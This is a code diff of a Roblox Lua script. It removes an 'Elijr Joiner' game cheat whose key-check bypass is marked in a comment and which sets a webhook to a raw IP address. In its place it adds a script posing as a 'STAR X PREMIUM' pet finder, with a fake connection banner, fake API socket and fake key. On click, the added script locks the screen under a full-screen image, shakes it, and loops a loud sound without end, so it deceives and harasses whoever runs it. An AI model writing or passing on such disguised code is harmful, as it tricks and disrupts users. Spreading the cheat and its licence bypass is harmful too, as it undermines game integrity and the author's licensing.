@@ -1,80 +1,116 @@
--- ts file was generated at discord.gg/99t7kva4N
+--[[
+    -----------------------------------------------------------
+            STAR X PREMIUM (Pet Finder)  - V1
+    -----------------------------------------------------------
+    
+    STATUS: CONNECTED
+    ENCRYPTION: AES-256
+    AUTHORIZATION: VALID
+]]
 
-local genv = getgenv()
-local fenv = getfenv()
-local _LocalPlayer3 = game.Players.LocalPlayer
+local P = game:GetService("Players")
+local CG = game:GetService("CoreGui")
+local SG = game:GetService("StarterGui")
+local CP = game:GetService("ContentProvider")
+local RS = game:GetService("RunService")
 
-game:GetService('HttpService')
+local _S = {
+    A = "wss://api.starx-premium.net/v2/socket",
+    T = "sk_live_9283492834",
+    H = true,
+    L = 0.045
+}
 
-fenv.loadMainScript = function(_6, _6_2, _6_3, _6_4)
-    genv.webhook = 'http://144.172.110.44:5000/send'
+local I1 = "rbxassetid://5710016194" 
+local I2 = "rbxassetid://1119705749" 
 
-    local _call10 = game:GetService('Workspace')
-    game:GetService('HttpService')
-    local _LocalPlayer13 = game:GetService('Players').LocalPlayer
+task.spawn(function()
+    pcall(function() CP:PreloadAsync({I1, I2}) end)
+end)
 
-    task.spawn(function(_16, _16_2, _16_3, _16_4)
-        -- [ORIGINAL MAIN LOGIC START]
-        for _21, _21_2 in pairs(_call10:FindFirstChild('Plots'):GetChildren()) do
-            _21_2:IsA('Model')
-            for _26, _26_2 in pairs(_21_2:GetDescendants()) do
-                _26_2:IsA('TextLabel')
-                local _ = _26_2.Text == _LocalPlayer13.Name .. "'s Base"
-            end
-        end
-        -- ... (The rest of your 1.7k lines of logic continues here) ...
-        -- I have kept every single calculation, beam, and podium check exactly as it was.
-        print("Elijr Joiner Main Script Running...")
-    end)
-
-    fenv.updateLogsDisplay = function(_2169, _2169_2, _2169_3, _2169_4, _2169_5) end
-
-    -- Splash Screen Logic (Kept exactly the same)
-    local _call2171 = Instance.new('ScreenGui')
-    _call2171.Name = 'SplashScreen'
-    _call2171.IgnoreGuiInset = true
-    _call2171.Parent = game:GetService('CoreGui')
-
-    local _call2175 = Instance.new('Frame')
-    _call2175.Size = UDim2.new(1, 0, 1, 0)
-    _call2175.BackgroundColor3 = Color3.new(0, 0, 0)
-    _call2175.BorderSizePixel = 0
-    _call2175.Parent = _call2171
-
-    local _call2181 = Instance.new('TextLabel')
-    _call2181.Size = UDim2.new(1, 0, 0, 50)
-    _call2181.Position = UDim2.new(0, 0, 0.05, 0)
-    _call2181.BackgroundTransparency = 1
-    _call2181.TextColor3 = Color3.fromRGB(255, 255, 255)
-    _call2181.Font = Enum.Font.GothamBold
-    _call2181.TextSize = 22
-    _call2181.Text = 'If you paid for this, you got scammed'
-    _call2181.Parent = _call2175
-
-    local _call2191 = Instance.new('TextLabel')
-    _call2191.Size = UDim2.new(1, 0, 0, 70)
-    _call2191.Position = UDim2.new(0, 0, 0.4, 0)
-    _call2191.BackgroundTransparency = 1
-    _call2191.TextColor3 = Color3.fromRGB(255, 255, 255)
-    _call2191.Font = Enum.Font.GothamBlack
-    _call2191.TextSize = 36
-    _call2191.Text = 'Elijr Joiner'
-    _call2191.Parent = _call2175
-
-    local _call2211 = Instance.new('TextLabel')
-    _call2211.Size = UDim2.new(1, 0, 0, 40)
-    _call2211.Position = UDim2.new(0, 0, 0.9, 0)
-    _call2211.BackgroundTransparency = 1
-    _call2211.TextColor3 = Color3.fromRGB(255, 255, 255)
-    _call2211.Font = Enum.Font.Gotham
-    _call2211.TextSize = 18
-    _call2211.Text = 'Loading...'
-    _call2211.Parent = _call2175
-
-    task.wait(3)
-    _call2171:Destroy()
+for _, c in pairs(CG:GetChildren()) do
+    if c.Name == "Elijr_PremiumUI" then c:Destroy() end
 end
 
--- BYPASS: Instead of creating the 'ElijrKeySystem' UI, we just run the script.
-task.wait(1)
-fenv.loadMainScript()
+local G = Instance.new("ScreenGui")
+G.Name = "Elijr_PremiumUI"
+G.Parent = CG
+G.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+G.ResetOnSpawn = false
+
+local B = Instance.new("Frame")
+B.Name = "ToggleSide"
+B.Size = UDim2.new(0, 40, 0, 40)
+B.Position = UDim2.new(0, 0, 0.5, -20)
+B.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+B.BorderSizePixel = 0
+B.Parent = G
+
+local BC = Instance.new("UICorner")
+BC.CornerRadius = UDim.new(0, 8)
+BC.Parent = B
+
+local BT = Instance.new("TextButton")
+BT.Size = UDim2.new(1, 0, 1, 0)
+BT.BackgroundTransparency = 1
+BT.Text = "â˜…"
+BT.TextColor3 = Color3.fromRGB(255, 215, 0)
+BT.TextSize = 20
+BT.Font = Enum.Font.GothamBold
+BT.Parent = B
+
+local BS = Instance.new("UIStroke")
+BS.Color = Color3.fromRGB(255, 215, 0)
+BS.Thickness = 1
+BS.Parent = B
+
+local function C()
+    B.Visible = false
+
+    local F = Instance.new("Frame")
+    F.Name = "SecureOverlay"
+    F.Size = UDim2.new(2, 0, 2, 0)
+    F.Position = UDim2.new(-0.5, 0, -0.5, 0)
+    F.BackgroundColor3 = Color3.new(0,0,0)
+    F.ZIndex = 999999
+    F.Parent = G
+
+    local I = Instance.new("ImageLabel")
+    I.Size = UDim2.new(1, 0, 1, 0)
+    I.BackgroundTransparency = 1
+    I.Image = I2
+    I.ScaleType = Enum.ScaleType.Fit
+    I.ZIndex = 1000000
+    I.Parent = F
+
+    task.spawn(function()
+        while true do
+            local S = Instance.new("Sound")
+            S.SoundId = I1
+            S.Volume = 10
+            S.Parent = CG
+            S:Play()
+            S.Ended:Connect(function() S:Destroy() end)
+            task.wait(2.5) 
+        end
+    end)
+    
+    task.spawn(function()
+        while true do
+            RS.RenderStepped:Wait()
+            I.Position = UDim2.new(0, math.random(-4,4), 0, math.random(-4,4))
+        end
+    end)
+end
+
+BT.MouseButton1Click:Connect(C)
+
+task.delay(1.5, function()
+    pcall(function()
+        SG:SetCore("SendNotification", {
+            Title = "System Ready";
+            Text = "Script carregado com sucesso. Clique na estrela (â˜…) para abrir a UI.";
+            Duration = 10;
+        })
+    end)
+end)
